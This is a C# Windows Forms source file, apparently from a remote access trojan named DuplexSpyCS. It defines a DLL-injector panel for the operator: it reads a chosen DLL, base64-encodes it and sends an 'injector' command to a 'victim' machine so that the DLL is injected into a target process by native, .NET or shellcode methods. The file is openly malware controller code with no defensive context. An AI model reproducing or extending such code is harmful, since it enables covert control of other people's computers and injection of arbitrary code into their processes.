using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmTaskDLLInjector : Form
    {
        public clsVictim m_victim { get; set; }
        private int m_nProcId { get; set; }

        public frmTaskDLLInjector(clsVictim victim, int nProcId)
        {
            InitializeComponent();

            m_victim = victim;
            m_nProcId = nProcId;

            Text = $"Injector | {victim.ID}";
        }

        public enum enMethod
        {
            Native,
            DotNet,
            ShellCode,
        }

        private void fnSetup()
        {
            textBox2.Text = m_nProcId.ToString();
        }

        private void frmTaskDLLInjector_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "DLL File (*.dll)|*.dll";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                int nIdx = tabControl1.SelectedIndex;

                string szFileName = textBox1.Text;
                int nProcId = int.Parse(textBox2.Text);
                List<string> lsArgs = textBox3.Text.Split(' ').ToList();

                byte[] abBuffer = File.ReadAllBytes(szFileName);
                Task.Run(() =>
                {
                    switch (nIdx)
                    {
                        case 0:
                            m_victim.fnSendCommand(new string[]
                            {
                                "injector",
                                nIdx.ToString(),
                                Convert.ToBase64String(abBuffer),
                                nProcId.ToString(),
                            });
                            break;
                        case 1:
                            m_victim.fnSendCommand(new string[]
                            {
                                "injector",
                                nIdx.ToString(),
                                Convert.ToBase64String(abBuffer),
                                string.Join(",", lsArgs.Select(x => clsCrypto.b64E2Str(x))),
                            });
                            break;
                        case 2:
                            m_victim.fnSendCommand(new string[]
                            {
                                "injector",
                                nIdx.ToString(),

                            });
                            break;
                    }
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
